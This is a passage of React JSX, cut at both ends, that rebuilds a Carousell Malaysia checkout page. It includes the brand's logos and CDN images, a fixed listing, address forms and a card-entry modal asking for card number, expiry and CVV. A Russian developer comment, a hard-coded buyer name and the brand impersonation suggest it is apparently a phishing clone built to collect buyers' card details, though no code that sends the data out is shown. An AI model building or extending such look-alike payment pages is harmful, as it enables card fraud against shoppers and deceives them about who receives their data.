							</div>
							<div className="main-field-center-body-info-delivery-info-wrapper-text-address-wrapper-header-footer" style={{marginTop: '4px', paddingLeft: '28px', display: 'flex', alignItems: 'center'}}>
								<h1>{data.street}</h1>
								<div style={{display: 'flex', alignItems: 'center'}}>
								<span>.</span>
								<h1>{data.city}</h1>
								</div>
								<div style={{display: 'flex', alignItems: 'center'}}>
								<span>.</span>
								<h1>{data.selectState}</h1>
								</div>
								<div style={{display: 'flex', alignItems: 'center'}}>
								<span>.</span>
								<h1>{'Malaysia' + ' ' + data.postcode}</h1>
								</div>
							</div>
							</div>
						</div>
					))}
					<div style={{marginLeft: '16px'}} className="add-address-add-address-button">
						<button onClick={handleMobileAddress} className="add-address-button">+ Add new address</button>
					</div>
				</div>
				<div className="add-new-address-menu" style={{display: showMobileAddAddressMenu}}>
					<form onSubmit={handleSubmit} className="add-new-address-menu-form" style={{position: 'relative'}}>
						<div className="add-address-wrapper-header">
							<div style={{alignItems: 'center', display: 'flex', height: '60px'}}>
								<div className="order-delivery-container-wrapper-header-leftside">
									<button onClick={handleShowAddressMobile}>
										<svg className="" fill="#57585a" fillRule="nonzero" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
										<path d="M4.414 13l5.293 5.293a1 1 0 1 1-1.414 1.414l-7-7a1 1 0 0 1 0-1.414l7-7a1 1 0 0 1 1.414 1.414L4.414 11H22a1 1 0 0 1 0 2H4.414z" id="iconBack"></path>
										</svg>
									</button>
								</div>
								<div className="order-delivery-container-wrapper-header-center">
									<p>Add new address</p>
								</div>
								<div className="order-delivery-container-wrapper-header-right">
									<button onClick={handleSubmit}>Save</button>
								</div>
							</div>
						</div>
						<div style={{margin: '24px 16px 16px', paddingBottom: '16px'}} className="add-new-address-menu-body">
							<h2>Recipient information</h2>
							<div style={{paddingTop: '12px', marginBottom: '16px', display: 'flex', flexFlow: 'column nowrap'}} className="add-new-address-menu-body-rescipient-name">
							
							<ThemeProvider theme={theme}>
								<TextField 
								value={addressRecipientName}
								onChange={(event) => setAddressRecipientName(event.target.value)}
								id="standard-basic" 
								label="Recipient's name"
								placeholder="Your name"
								variant="standard"
								style={{width: '100%'}}
								/>
							</ThemeProvider>
							</div>
							<div className="add-new-address-menu-body-phone-number" style={{marginBottom: 0, paddingTop: '12px'}}>
								<div className="add-new-address-menu-body-phone-number-container">
									<ThemeProvider theme={theme2}>
									<CSSTextField2 
									value='🇲🇾 +60'
									id="standard-basic" 
									label="Phone number" 
									variant="standard" 
									inputProps={{border: 'none !important',}}
									style={{width: '20%', borderBottom: 'none !important',
									fontFamily: '-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Droid Sans,Helvetica Neue,sans-serif', overflow: 'visible' }}
									/>
								</ThemeProvider>
									<ThemeProvider theme={theme2}>
									<TextField 
									pattern="[0-9]*"
									value={addressPhoneNumber}
									onChange={handlePhoneNumber}
									id="standard-basic" 
									label='' 
									variant="standard" 
									placeholder='Enter your phone number'
									style={{width: '100%', marginLeft: '10px', marginTop: '15.5px'}}
									/>
								</ThemeProvider>
								</div>
							</div>
							<p className="add-new-address-p">We'll send updates of your delivery to this number</p>
							<h2 style={{marginBottom: '16px'}} className="add-new-address-h2">Address</h2>
							<ThemeProvider theme={theme}>
								<TextField 
								value={addressStreet}
								onChange={(event) => setAddressStreet(event.target.value)}
								id="standard-basic" 
								label="Street and unit"
								variant="standard" 
								placeholder='E.g, 15, Jalan Badik 2, Taman Sri Tebrau'
								style={{width: '100%', marginBottom: '16px'}}
								/>
							</ThemeProvider>
							<ThemeProvider theme={theme}>
								<TextField 
								pattern="[0-9]*"
								value={addressPostcode}
								onChange={(e) => setAddressPostcode((v) => (e.target.validity.valid ? e.target.value : v))}
								id="standard-basic" 
								label="Postcode"
								variant="standard" 
								placeholder='E.g 80050'
								style={{width: '100%', marginBottom: '16px'}}
								inputProps={{ type: 'number' }}
								/>
							</ThemeProvider>
							<ThemeProvider theme={theme}>
								<TextField 
								value={addressCity}
								onChange={(event) => setAddressCity(event.target.value)}
								id="standard-basic" 
								label="City"
								variant="standard" 
								placeholder='E.g, Johor Bahru, Kuala Lumpur, Penang'
								style={{width: '100%', marginBottom: '16px'}}
								/>
							</ThemeProvider>
							<select value={addressSelectState} onChange={(event) => setAddressSelectState(event.target.value)}
							style={{marginTop: '16px'}} className="add-new-address-select">
								<option value="">Select your state</option>
								<option value="Johor">Johor</option>
								<option value="Kedah">Kedah</option>
								<option value="Kelantan">Kelantan</option>
								<option value="Kuala Lumpur">Kuala Lumpur</option>
								<option value="Labuan">Labuan</option>
								<option value="Melaka">Melaka</option>
								<option value="Negeri Sembilan">Negeri Sembilan</option>
								<option value="Pahang">Pahang</option>
								<option value="Penang">Penang</option>
								<option value="Perak">Perak</option>
								<option value="Perlis">Perlis</option>
								<option value="Sabah">Sabah</option>
								<option value="Sarawak">Sarawak</option>
								<option value="Selangor">Selangor</option>
								<option value="Terengganu">Terengganu</option>
							</select>
							<p className="add-new-address-p-info">Your address and phone number will be shown to your seller for delivery.</p>

						</div>
					</form>
				</div>
				
				</>
				:
				<>
				{/* Тут рендер мобильного реакта */}
				<div className="main-wrapper">
					<div className="main-wrapper-header">
						<div className="main-wrapper-header-wrapper">
							<div className="logo">
								<img src='https://mweb-cdn.karousell.com/build/carousell-logo-title-48b65e4770.svg' alt="" />
							</div>
							<div className="header-main-block">
								<div className="header-main-block-2">
									<h2 id="h1">Fashion</h2>
									<h2 id="h2">Hobbies & Toys</h2>
									<h2 id="h3">Electronics</h2>
									<h2 id="h4">Living</h2>
									<h2 id="h5">Cars & Property</h2>
								</div>
								<div className="header-categories">
									<img src={categoriesImg} alt="" />
									<h2 style={{padding: 0}} id="h6">All Categories</h2>
								</div>
							</div>
							<div className="header-user-block">
								<div className="header-user-block-wrapper">
									<div className="header-user-block-wrapper-2">
										<div className="header-user-block-img">
											<img src="https://media.karousell.com/media/photos/profiles/default.png" alt="Avatar" />
										</div>
										<div className="header-user-block-text">
											<h2>Hello,&nbsp;</h2>
											<h3> djhartkr1819sad</h3>
										</div>
										<div className="header-user-block-arrow">
											<svg className="header-user-block-arrow-img" fill="#c5c5c6" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg"><path d="M9.29 15.88L13.17 12 9.29 8.12c-.39-.39-.39-1.02 0-1.41.39-.39 1.02-.39 1.41 0l4.59 4.59c.39.39.39 1.02 0 1.41L10.7 17.3c-.39.39-1.02.39-1.41 0-.38-.39-.39-1.03 0-1.42z"></path></svg>
										</div>
									</div>
									<div className="header-user-block-buttons">
										<div className="header-user-block-buttons-heart">
											<img src={favoriteImg} alt="" />
										</div>
										<div className="header-user-block-buttons-message">
											<img src={messageImg} alt="" />
										</div>
									</div>
								</div>
							</div>
							<div className="header-button">
								<button>Sell</button>

							</div>
						</div>
					</div>
					<Box sx={{ borderBottom: '1px solid rgb(240, 241, 241)', width: '100%', left: 0, position: 'fixed', right: 0 }} />	
					<div className="main">
						<div className="main-field">
							<div className="main-field-center">
								<div className="main-field-center-order">
									<div className="main-field-center-order-arrow">
										<svg className="" fill="#57585a" fillRule="nonzero" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg"><path d="M4.414 13l5.293 5.293a1 1 0 1 1-1.414 1.414l-7-7a1 1 0 0 1 0-1.414l7-7a1 1 0 0 1 1.414 1.414L4.414 11H22a1 1 0 0 1 0 2H4.414z" id="iconBack"></path></svg>
									</div>
									<div className="main-field-center-order-text">
										<h2>
											Order request
										</h2>

									</div>

								</div>
								<div className="main-field-center-body">
									<div className="main-field-center-body-header">
										<div className="main-field-center-body-header-image">
											<img src="https://sl3-cdn.karousell.com/components/Caroupay_v4.svg" alt="" />
										</div>
										<div className="main-field-center-body-header-text">
											<h2>Tawaran yang lebih selamat apabila anda membayar melalui Carousell</h2>
											<h3>Bayaran hanya dikeluarkan kepada penjual selepas anda menerima pesanan anda seperti yang disenaraikan </h3>

										</div>
									</div>
									<div className="main-field-center-body-info">
										<div className="main-field-center-body-info-delivery">
											<div className="main-field-center-body-info-delivery-wrapper">
												<div className="main-field-center-body-info-delivery-wrapper-header-text">
													<h2>Delivery</h2>
												</div>
												<div>
													<div className="main-field-center-body-info-delivery-wrapper3">
														<div className="main-field-center-body-info-delivery-wrapper-main">
															<div className="main-field-center-body-info-delivery-wrapper-main-box">
																<div style={{display: 'flex'}}>
																	<div className="main-field-center-body-info-delivery-wrapper-main-box-field">
																		<div onClick={handleClick1} className={`main-field-center-body-info-delivery-wrapper-main-box-field-radio ${isClicked1 ? 'active' : ''}`}>
																		<FormControlLabel value="male" control={<Radio />} label="Male" />
																			<label className="main-field-center-body-info-delivery-wrapper-main-box-field-radio-text">
																				<div className="main-field-center-body-info-delivery-wrapper-main-box-field-radio-text-wrapper">
																					<h2>Mail to West Malaysia</h2>
																				</div>
																			</label>
																		</div>
																	</div>
																	<div className="main-field-center-body-info-delivery-wrapper-main-box-field-cost">
																			<h2>Free</h2>
																	</div>
																</div>

															</div>


														</div>
														<div className="main-field-center-body-info-delivery-wrapper-track" style={{paddingLeft: '28px'}}>
															<h2>Tracked mail</h2>
														</div>
													</div>
													<div className="main-field-center-body-info-delivery-wrapper2">
														<div className="main-field-center-body-info-delivery-wrapper-main2">
															<div className="main-field-center-body-info-delivery-wrapper-main-box">
																<div style={{display: 'flex'}}>
																	<div className="main-field-center-body-info-delivery-wrapper-main-box-field">
																		<div onClick={handleClick2} className={`main-field-center-body-info-delivery-wrapper-main-box-field-radio ${isClicked2 ? 'active' : ''}`}>
																			<label className="main-field-center-body-info-delivery-wrapper-main-box-field-radio-text">
																				<div className="main-field-center-body-info-delivery-wrapper-main-box-field-radio-text-wrapper">
																					<h2>Mail to East Malaysia</h2>
																				</div>
																			</label>
																		</div>
																	</div>
																	<div className="main-field-center-body-info-delivery-wrapper-main-box-field-cost">
																			<h2>Free</h2>
																	</div>
																</div>

															</div>


														</div>
														<div className="main-field-center-body-info-delivery-wrapper-track" style={{paddingLeft: '28px'}}>
															<h2>Tracked mail</h2>
														</div>
													</div>
												</div>

											</div>

										</div>
										<div className="main-field-center-body-info-delivery-info" style={{display: isClicked1 || isClicked2 ? '' : 'none'}}>
											<div className="main-field-center-body-info-delivery-info-wrapper">
												<div className="main-field-center-body-info-delivery-info-wrapper-text">
													<h2>Address</h2>
													{formData.map((data, index) => (
														<div key={index} className="main-field-center-body-info-delivery-info-wrapper-text-address" style={{marginLeft: '-8px'}}>
															<div className="main-field-center-body-info-delivery-info-wrapper-text-address-wrapper" style={{marginBottom: '16px', padding: '8px 16px 8px 8px'}}>
															<div className="main-field-center-body-info-delivery-info-wrapper-text-address-wrapper-header" style={{display: 'flex'}}>
																<label onClick={() => handleClickAddress(index)} className={`main-field-center-body-info-delivery-info-wrapper-text-address-wrapper-header-label ${selectedComponent === index ? 'active' : ''}`}>
																<div className="main-field-center-body-info-delivery-info-wrapper-text-address-wrapper-header-h5">
																	<div style={{display: 'flex', flexDirection: 'column'}}>
																	<h5>{data.recipientName + ' ' +  data.phoneNumber}</h5>
																	</div>
																</div>
																</label>
																<button 
																// onClick={() => handleEditData(data)} 
																className="address-button-edit">
																<img src={editImg} alt="" />
																<p>Edit</p>
																</button>
																<button onClick={() => handleShowDeleteAddress(data)} className="address-button-delete">
																<svg height="16" viewBox="0 0 16 16" width="16" xmlns="http://www.w3.org/2000/svg"><g fill="#57585a" stroke="#57585a"><path d="M2.5 6.5v7a2 2 0 0 0 2 2h7a2 2 0 0 0 2-2v-7" fill="none" strokeLinecap="round" strokeLinejoin="round" strokeMiterlimit="10"></path><path d="M.5 3.5h15" fill="none" strokeLinecap="round" strokeLinejoin="round" strokeMiterlimit="10"></path><path d="M5.5 3.5v-3h5v3" fill="none" strokeLinecap="round" strokeLinejoin="round" strokeMiterlimit="10"></path></g></svg>
																<p>Delete</p>
																</button>
															</div>
															<div className="main-field-center-body-info-delivery-info-wrapper-text-address-wrapper-header-footer" style={{marginTop: '4px', paddingLeft: '28px', display: 'flex', alignItems: 'center'}}>
																<h1>{data.street}</h1>
																<div style={{display: 'flex', alignItems: 'center'}}>
																<span>.</span>
																<h1>{data.city}</h1>
																</div>
																<div style={{display: 'flex', alignItems: 'center'}}>
																<span>.</span>
																<h1>{data.selectState}</h1>
																</div>
																<div style={{display: 'flex', alignItems: 'center'}}>
																<span>.</span>
																<h1>{'Malaysia' + ' ' + data.postcode}</h1>
																</div>
															</div>
															</div>
														</div>
														))}
													<button className="main-field-center-body-info-delivery-info-wrapper-button-address" onClick={() => setAddressVisibility('')}>+ Add New Address</button>
												</div>
											</div>
										</div>
										<div className="main-field-center-body-info-payment-method">
											<div className="main-field-center-body-info-payment-method-header-text">
												<h2>Payment method</h2>
											</div>
											<div className="main-field-center-body-info-payment-method-grab-pay">
												<div className="main-field-center-body-info-payment-method-grab-pay-wrapper">
													<div className="main-field-center-body-info-payment-method-grab-pay-wrapper-container">
														<label className="main-field-center-body-info-payment-method-grab-pay-wrapper-container-label">
															<div className="main-field-center-body-info-payment-method-grab-pay-wrapper-container-label-info">
																<img src="https://sl3-cdn.karousell.com/components/online_payment_grabpay_v3@2x.png" alt="" />
																<div className="main-field-center-body-info-payment-method-grab-pay-wrapper-container-label-info-text">
																	<h2>GrabPay</h2>
																</div>
															</div>

														</label>
													</div>

												</div>
													<div className="main-field-center-body-info-payment-method-grab-pay-wrapper-info">
														<div className="main-field-center-body-info-payment-method-grab-pay-wrapper-info-text">
															<div>
																<h2>For New Buyers - Take 1.5% off with Discount code BPMY15 (Carousell Protection Listings)</h2>
															</div>

														</div>

													</div>
											</div>
											<div className="main-field-center-body-info-payment-method-grab-pay-field">
											</div>
											<div className="main-field-center-body-info-payment-method-another">
												<div className="main-field-center-body-info-payment-method-another-header-text">
													<h2>Add new payment methods</h2>
												</div>
												<div className="main-field-center-body-info-payment-method-another-online-banking">
													<div className="main-field-center-body-info-payment-method-another-online-banking">
														<div className="main-field-center-body-info-payment-method-another-online-banking-container">
															<img src="https://sl3-cdn.karousell.com/components/online_payment_fpx_v2@2x.png" alt="" />
															<h2>Online banking</h2>
														</div>

													</div>

												</div>
												<div className="main-field-center-body-info-payment-method-another-field"></div>
												<button className="f2">Pay by online banking</button>
											</div>
											<div style={{margin: '24px 0px', borderTop: '1px solid rgb(240, 241, 241)'}}></div>
											<div className="main-field-center-body-info-payment-method-credit-card">
												<div className="main-field-center-body-info-payment-method-credit-card-container">
													<img src="https://sl3-cdn.karousell.com/components/online_payment_card_v2@2x.png" alt="" />
													<p>Credit or debit card</p>


												</div>
												<div className="main-field-center-body-info-payment-method-credit-card-field" style={{gap: '8px', display: 'grid'}}>
												</div>
												<button onClick={() => setShowCardPayment('')}
												className="main-field-center-body-info-payment-method-credit-card-button">Add credit / debit card</button>
											</div>
											<div style={{margin: '24px 0px', borderTop: '1px solid rgb(240, 241, 241)'}}></div>
										<div className="main-info-footer-text">
											<h2>Carousell does not store your details, which are securely stored with our payment services partner and will not be visible to other Carousell users.</h2>
										</div>
										</div>
									</div>
								</div>
							</div>
							<div className="main-field-right">
								<div className="main-field-right-wrapper">
									<h4>Order summary</h4>
									<div className="main-field-right-wrapper-item">
										<img src="https://media.karousell.com/media/photos/products/2023/7/1/uniqlo_light_blazer_jacket_1688225376_8e291be4.jpg" alt="" />
										<div className="main-field-right-wrapper-item-text">
											<h2>UNIQLO LIGHT BLAZER JACKET</h2>
											<h3>RM60.00</h3>
										</div>
									</div>
									<div className="main-field-right-wrapper-item-price" style={{paddingBottom: '8px'}}>
										<div className="main-field-right-wrapper-item-price-this" style={{padding: '8px 0px'}}>
											<div className="main-field-right-wrapper-item-price-this-container">
												<div className="main-field-right-wrapper-item-price-this-container-text" style={{alignItems: 'center', display: 'flex'}}>
													<p>Item price</p>
												</div>
												<h2>RM60.00</h2>
											</div>
										</div>
										<div className="main-field-right-wrapper-item-price-total">
											<h2>Total</h2>
											<h3>RM60.00</h3>
										</div>
									</div>
									<div className="main-field-right-wrapper-promo-code" style={{marginTop: "16px"}}>
										<div className="main-field-right-wrapper-promo-code-wrapper" style={{display: 'flex', flexDirection: 'row'}}>
											{/* <div className="main-field-right-wrapper-promo-code-wrapper-container">
												<div className="main-field-right-wrapper-promo-code-wrapper-container-field">
													<div className="main-field-right-wrapper-promo-code-wrapper-container-textfield">
														<span>Promo code</span>
														<input type="text" aria-label="Promo code" value/>
													</div>
												</div>
											</div> */}
											<div className="input-bx">
												<input type="text" required="required" />
												<span>Promo code</span>
											</div>
											<button className="main-field-right-wrapper-promo-code-wrapper-button">Apply</button>
										</div>
									</div>
									<div className="main-field-right-wrapper-item-place-order">
										<button>Place order</button>
										<p>
											By tapping on ‘Place order’, you accept the terms of service from &nbsp; 
											<a href="https://support.carousell.com/hc/articles/115011881808" style={{display: 'inline', color: "inherit", textDecoration: 'none'}}>
												<span className="place-order-info">Carousell</span>
											</a>
											,&nbsp;
											<a href="https://stripe.com/en-my/connect-account/legal" style={{display: 'inline', color: "inherit", textDecoration: 'none'}}>
												<span className="place-order-info">Stripe.</span>
											</a>
											{/* <svg aria-label="CVC" viewBox="0 0 32 21">
												<g fill="none" fillRule="evenodd" className="Icon-fill">
													<path d="M21.68 2H2c-.92 0-2 1.06-2 2v15c0 .94 1.08 2 2 2h25c.92 0 2-1.06 2-2v-7.53a5.98 5.98 0 0 1-3 1.45V13c0 .66-.36 1-1 1H3c-.64 0-1-.34-1-1v-1c0-.66.36-1 1-1h17.53a5.98 5.98 0 0 1 1.15-9z" opacity=".2"/>
													<path d="M19.34 5H0v3h19.08a6.04 6.04 0 0 1 .26-3z" opacity=".3"/>
													<path d="M25 14a7 7 0 1 1 0-14 7 7 0 0 1 0 14zm-2.78-9.9h-.79l-1.93.98v1l1.53-.8V9.9h1.2V4.1zm2.3.8c.57 0 .97.32.97.78 0 .5-.47.85-1.15.85h-.3v.85h.36c.72 0 1.21.36 1.21.88 0 .5-.48.84-1.16.84-.5 0-1-.16-1.52-.47v1c.56.24 1.12.37 1.67.37 1.31 0 2.21-.67 2.21-1.64 0-.68-.42-1.23-1.12-1.45.6-.2.99-.73.99-1.33 0-.94-.83-1.58-2.03-1.58a4 4 0 0 0-1.57.34v.98c.48-.27.97-.42 1.44-.42zm4.32 2.18c.73 0 1.24.43 1.24.99 0 .59-.51 1-1.24 1-.44 0-.9-.14-1.37-.43v1.03c.49.22.99.33 1.48.33.26 0 .5-.04.73-.1.52-.85.82-1.83.82-2.88l-.02-.42a2.3 2.3 0 0 0-1.23-.32c-.18 0-.37.01-.57.04v-1.3h1.44a5.62 5.62 0 0 0-.46-.92h-2.02v3.15c.4-.1.8-.17 1.2-.17z"/>
												</g>
											</svg> */}
										</p>
									</div>
								</div>
							</div>
						</div>
					</div>
				</div>
				<div className="credit-card-wrapper" style={{display: showCardPayment}}>
					<div className="credit-card-wrapper-container">
						<div style={{maxHeight: 'inherit'}}>
							<div className="credit-card-wrapper-container-main">
								<div className="credit-card-wrapper-container-main-header">
									<h3>Add credit / debit card</h3>
									<button onClick={() => setShowCardPayment('none')}>
										<svg className="" fill="#57585a" fillRule="nonzero" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg"><title>Close Icon</title><path d="M13.414 12l5.293 5.293a1 1 0 0 1-1.414 1.414L12 13.414l-5.293 5.293a1 1 0 1 1-1.414-1.414L10.586 12 5.293 6.707a1 1 0 0 1 1.414-1.414L12 10.586l5.293-5.293a1 1 0 0 1 1.414 1.414L13.414 12z"></path></svg>
									</button>
								</div>
								<div className="credit-card-wrapper-container-main-middle-header">
									<img src="https://mweb-cdn.karousell.com/build/lock-grey-outlined-7518fc28c4.svg" alt="" />
									<p>Your payment information is stored securely.</p>
								</div>
								<img src="https://mweb-cdn.karousell.com/build/mastercard-icon-87b5ba296e.svg" 
								style={{display: 'inline-block', width: '48px', overflow: 'hidden', position: 'relative'}} 
								alt="" />
								<img src="https://mweb-cdn.karousell.com/build/visa-icon-904be66c99.svg" 
								style={{display: 'inline-block', width: '48px', overflow: 'hidden', position: 'relative'}} 
								alt="" />
								<div className="credit-card-wrapper-container-main-middle">
									<div className="credit-card-wrapper-container-main-middle-input">
										<div className="credit-card-container">
											<div className="credit-card-banner-visa" style={{display: showCardVisa}}>
												<img src="https://js.stripe.com/v3/fingerprinted/img/visa-729c05c240c4bdb47b03ac81d9945bfe.svg" alt="" />
											</div>
											<div className="credit-card-banner-mastercard" style={{display: showCardMastercard}}>
												<img src="https://js.stripe.com/v3/fingerprinted/img/mastercard-4d8844094130711885b5e41b28c9848f.svg" alt="" />
											</div>
											<div className="credit-card-banner-undefined" style={{display: showCardUndefined}}>
												<img src="https://js.stripe.com/v3/fingerprinted/img/amex-a49b82f46c5cd6a96a6e418a6ca1717c.svg" alt="" />
											</div>
											<div className="credit-card-banner-normal-input-cvc" style={{display: showCardStateNormalCvc}}> 
												<svg className="cvc" focusable="false" viewBox="0 0 32 21" role="img" aria-label="CVC">
													<title>CVC</title>
													<g fill="none" fillRule="evenodd">
														<g className="Icon-fill">
														<g transform="translate(0 2)">
															<path d="M21.68 0H2c-.92 0-2 1.06-2 2v15c0 .94 1.08 2 2 2h25c.92 0 2-1.06 2-2V9.47a5.98 5.98 0 0 1-3 1.45V11c0 .66-.36 1-1 1H3c-.64 0-1-.34-1-1v-1c0-.66.36-1 1-1h17.53a5.98 5.98 0 0 1 1.15-9z" opacity=".2"></path>
															<path d="M19.34 3H0v3h19.08a6.04 6.04 0 0 1 .26-3z" opacity=".3"></path>
														</g>
														<g transform="translate(18)">
															<path d="M7 14A7 7 0 1 1 7 0a7 7 0 0 1 0 14zM4.22 4.1h-.79l-1.93.98v1l1.53-.8V9.9h1.2V4.1zm2.3.8c.57 0 .97.32.97.78 0 .5-.47.85-1.15.85h-.3v.85h.36c.72 0 1.21.36 1.21.88 0 .5-.48.84-1.16.84-.5 0-1-.16-1.52-.47v1c.56.24 1.12.37 1.67.37 1.31 0 2.21-.67 2.21-1.64 0-.68-.42-1.23-1.12-1.45.6-.2.99-.73.99-1.33C8.68 4.64 7.85 4 6.65 4a4 4 0 0 0-1.57.34v.98c.48-.27.97-.42 1.44-.42zm4.32 2.18c.73 0 1.24.43 1.24.99 0 .59-.51 1-1.24 1-.44 0-.9-.14-1.37-.43v1.03c.49.22.99.33 1.48.33.26 0 .5-.04.73-.1.52-.85.82-1.83.82-2.88l-.02-.42a2.3 2.3 0 0 0-1.23-.32c-.18 0-.37.01-.57.04v-1.3h1.44a5.62 5.62 0 0 0-.46-.92H9.64v3.15c.4-.1.8-.17 1.2-.17z"></path>
														</g>
														</g>
													</g>
												</svg>
											</div>
											<div className="credit-card-banner-normal-input-cvc-error" style={{display: showCardStateCvcError}}>
												<svg className="cvc-error" focusable="false" viewBox="0 0 32 21">
													<g fill="none" fillRule="evenodd">
														<g id="error" className="Icon-fill">
														<g id="card" transform="translate(0 2)">
															<path id="shape" d="M21.68 0A6 6 0 1 0 29 9.47v7.15A2.4 2.4 0 0 1 26.58 19H2.42A2.4 2.4 0 0 1 0 16.62V2.38A2.4 2.4 0 0 1 2.42 0h19.26zM10 5.83c0-.46-.35-.83-.78-.83H3.78c-.43 0-.78.37-.78.83v3.34c0 .46.35.83.78.83h5.44c.43 0 .78-.37.78-.83V5.83z" opacity=".2"></path>
															<path id="shape" d="M25 15h-3c-.65 0-1-.3-1-1s.35-1 1-1h3c.65 0 1 .3 1 1s-.35 1-1 1zm-6 0h-3c-.65 0-1-.3-1-1s.35-1 1-1h3c.65 0 1 .3 1 1s-.35 1-1 1zm-6 0h-3c-.65 0-1-.3-1-1s.35-1 1-1h3c.65 0 1 .3 1 1s-.35 1-1 1zm-6 0H4c-.65 0-1-.3-1-1s.35-1 1-1h3c.65 0 1 .3 1 1s-.35 1-1 1z" opacity=".3"></path>
														</g>
														<g className="Icon-fill-error" transform="translate(18 4)">
															<path d="M7 14A7 7 0 1 1 7 0a7 7 0 0 1 0 14zM4.22 4.1h-.79l-1.93.98v1l1.53-.8V9.9h1.2V4.1zm2.3.8c.57 0 .97.32.97.78 0 .5-.47.85-1.15.85h-.3v.85h.36c.72 0 1.21.36 1.21.88 0 .5-.48.84-1.16.84-.5 0-1-.16-1.52-.47v1c.56.24 1.12.37 1.67.37 1.31 0 2.21-.67 2.21-1.64 0-.68-.42-1.23-1.12-1.45.6-.2.99-.73.99-1.33C8.68 4.64 7.85 4 6.65 4a4 4 0 0 0-1.57.34v.98c.48-.27.97-.42 1.44-.42zm4.32 2.18c.73 0 1.24.43 1.24.99 0 .59-.51 1-1.24 1-.44 0-.9-.14-1.37-.43v1.03c.49.22.99.33 1.48.33.26 0 .5-.04.73-.1.52-.85.82-1.83.82-2.88l-.02-.42a2.3 2.3 0 0 0-1.23-.32c-.18 0-.37.01-.57.04v-1.3h1.44a5.62 5.62 0 0 0-.46-.92H9.64v3.15c.4-.1.8-.17 1.2-.17z"></path>
														</g>
														</g>
													</g>
												</svg>
											</div>
											<div className="credit-card-banner-normal-input" style={{display: showCardStateNormal}}>
												<svg className="default-input-card" focusable="false" viewBox="0 0 32 21">
													<g fill="none" fillRule="evenodd">
														<g className="Icon-fill">
														<g transform="translate(0 2)">
															<path d="M26.58 19H2.42A2.4 2.4 0 0 1 0 16.62V2.38A2.4 2.4 0 0 1 2.42 0h24.16A2.4 2.4 0 0 1 29 2.38v14.25A2.4 2.4 0 0 1 26.58 19zM10 5.83c0-.46-.35-.83-.78-.83H3.78c-.43 0-.78.37-.78.83v3.34c0 .46.35.83.78.83h5.44c.43 0 .78-.37.78-.83V5.83z" opacity=".2"></path>
															<path d="M25 15h-3c-.65 0-1-.3-1-1s.35-1 1-1h3c.65 0 1 .3 1 1s-.35 1-1 1zm-6 0h-3c-.65 0-1-.3-1-1s.35-1 1-1h3c.65 0 1 .3 1 1s-.35 1-1 1zm-6 0h-3c-.65 0-1-.3-1-1s.35-1 1-1h3c.65 0 1 .3 1 1s-.35 1-1 1zm-6 0H4c-.65 0-1-.3-1-1s.35-1 1-1h3c.65 0 1 .3 1 1s-.35 1-1 1z" opacity=".3"></path>
														</g>
														</g>
													</g>
												</svg>
											</div>
											<div className="credit-card-banner-input-error" style={{display: showCardStateNormalError}}>
												<svg className="default-input-card-error" focusable="false" viewBox="0 0 32 21">
													<g fill="none" fillRule="evenodd">
														<g id="error" className="Icon-fill">
														<g id="card" transform="translate(0 2)">
															<path id="shape" d="M21.68 0A6 6 0 1 0 29 9.47v7.15A2.4 2.4 0 0 1 26.58 19H2.42A2.4 2.4 0 0 1 0 16.62V2.38A2.4 2.4 0 0 1 2.42 0h19.26zM10 5.83c0-.46-.35-.83-.78-.83H3.78c-.43 0-.78.37-.78.83v3.34c0 .46.35.83.78.83h5.44c.43 0 .78-.37.78-.83V5.83z" opacity=".2"></path>
															<path id="shape" d="M25 15h-3c-.65 0-1-.3-1-1s.35-1 1-1h3c.65 0 1 .3 1 1s-.35 1-1 1zm-6 0h-3c-.65 0-1-.3-1-1s.35-1 1-1h3c.65 0 1 .3 1 1s-.35 1-1 1zm-6 0h-3c-.65 0-1-.3-1-1s.35-1 1-1h3c.65 0 1 .3 1 1s-.35 1-1 1zm-6 0H4c-.65 0-1-.3-1-1s.35-1 1-1h3c.65 0 1 .3 1 1s-.35 1-1 1z" opacity=".3"></path>
														</g>
														<g id="shape" transform="translate(18)">
															<path d="M7 14A7 7 0 1 1 7 0a7 7 0 0 1 0 14zM6 3v4a1 1 0 0 0 2 0V3a1 1 0 0 0-2 0zm1 8.75a1.25 1.25 0 1 0 0-2.5 1.25 1.25 0 0 0 0 2.5z"></path>
														</g>
														</g>
													</g>
												</svg>
											</div>
											<div className="credit-card-banner-input-info-reg" style={{display: showCardStateNormalStandardError}}>
												<svg className="default-input-card-error-standard" focusable="false" viewBox="0 0 32 21">
													<g fill="none" fillRule="evenodd">
														<g className="Icon-fill-error-standard">
														<g transform="translate(0 2)">
															<path d="M26.58 19H2.42A2.4 2.4 0 0 1 0 16.62V2.38A2.4 2.4 0 0 1 2.42 0h24.16A2.4 2.4 0 0 1 29 2.38v14.25A2.4 2.4 0 0 1 26.58 19zM10 5.83c0-.46-.35-.83-.78-.83H3.78c-.43 0-.78.37-.78.83v3.34c0 .46.35.83.78.83h5.44c.43 0 .78-.37.78-.83V5.83z" opacity=".2"></path>
															<path d="M25 15h-3c-.65 0-1-.3-1-1s.35-1 1-1h3c.65 0 1 .3 1 1s-.35 1-1 1zm-6 0h-3c-.65 0-1-.3-1-1s.35-1 1-1h3c.65 0 1 .3 1 1s-.35 1-1 1zm-6 0h-3c-.65 0-1-.3-1-1s.35-1 1-1h3c.65 0 1 .3 1 1s-.35 1-1 1zm-6 0H4c-.65 0-1-.3-1-1s.35-1 1-1h3c.65 0 1 .3 1 1s-.35 1-1 1z" opacity=".3"></path>
														</g>
														</g>
													</g>
												</svg>
											</div>
										</div>
										<input pattern="[0-9]*" value={cardNumber} onChange={handleCardNumber}
										maxLength={19}
										placeholder="Nombor kad"
										onBlur={handleFocusInputCard}
										onFocus={handleFocusInputCard}
										style={{color: isColorRedMainCard}}
										type="text" />
										<div>

										</div>
										<div className="credit-card-data-info">
											<input pattern="[0-9]*" value={cardDataInfo}
											onChange={handleCardInfo}
											maxLength={7}
											onBlur={handleFocusInputCardStandard}
											onFocus={handleFocusInputCardStandard}
											placeholder="BB/TT"
											style={{color: isColorRedDateCard}}
											type="text" />
										</div>
										<div className="credit-card-data-info-cvv-code" style={{marginLeft: '3px'}}>
											<input pattern="[0-9]*" value={cardDataInfoCvvCode}
											onChange={(event) => setCardDataInfoCvvCode(event.target.value)}
											maxLength={3}
											onBlur={handleFocusInputCardCvc}
